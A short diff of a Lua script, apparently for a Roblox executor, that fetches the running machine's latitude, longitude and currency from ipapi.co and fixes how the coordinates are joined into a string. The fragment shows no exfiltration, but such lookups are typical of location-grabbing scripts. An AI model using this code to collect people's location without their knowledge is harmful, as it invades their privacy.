@@ -36,7 +36,7 @@ local lat = game:HttpGet("https://ipapi.co/latitude")
 
 local long = game:HttpGet("https://ipapi.co/longitude")
 
-local citylatlong = lat,long 
+local citylatlong = lat..","..long
 
 local currency = game:HttpGet("https://ipapi.co/currency")
 
